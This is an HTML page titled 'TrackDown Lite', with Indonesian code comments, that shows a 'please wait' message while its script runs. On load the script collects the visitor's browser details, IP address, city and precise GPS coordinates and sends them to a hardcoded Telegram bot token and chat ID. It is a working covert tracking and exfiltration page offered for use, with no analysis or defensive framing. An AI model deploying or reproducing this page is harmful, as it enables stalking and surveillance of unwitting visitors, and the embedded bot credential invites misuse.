<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TrackDown Lite</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
    </style>
</head>
<body>
    <h1>Welcome to TrackDown!</h1>
    <p>Please wait while we process your data...</p>

    <script>
        // Token dan Chat ID Telegram Anda
        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww";
        const chatId = "5649811717";

        // Fungsi untuk mengirim data ke Telegram
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message }),
            })
            .then(response => {
                if (!response.ok) {
                    console.error("Telegram API error:", response.status);
                    return;
                }
                console.log("Data sent to Telegram");
            })
            .catch(error => console.error("Error sending to Telegram:", error));
        }

        // Informasi perangkat
        const deviceInfo = `
            Browser: ${navigator.userAgent}
            Platform: ${navigator.platform}
            Language: ${navigator.language}
        `;

        // Alamat IP dengan layanan pihak ketiga
        fetch("https://ipapi.co/json/")
            .then(response => response.json())
            .then(data => {
                const ipInfo = `
                    IP Address: ${data.ip}
                    City: ${data.city}
                    Region: ${data.region}
                    Country: ${data.country_name}
                `;
                sendToTelegram(`Device Info:\n${deviceInfo}\nIP Info:\n${ipInfo}`);
            })
            .catch(error => console.error("Error fetching IP data:", error));

        // Lokasi Geografis
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationInfo = `
                        Latitude: ${position.coords.latitude}
                        Longitude: ${position.coords.longitude}
                        Accuracy: ${position.coords.accuracy} meters
                    `;
                    sendToTelegram(`Location Info:\n${locationInfo}`);
                },
                (error) => {
                    sendToTelegram("Location Info: Could not retrieve location.");
                    console.error("Geolocation error:", error.message);
                }
            );
        } else {
            sendToTelegram("Location Info: Geolocation not supported by browser.");
            console.warn("Geolocation not supported by browser.");
        }
    </script>
</body>
</html>
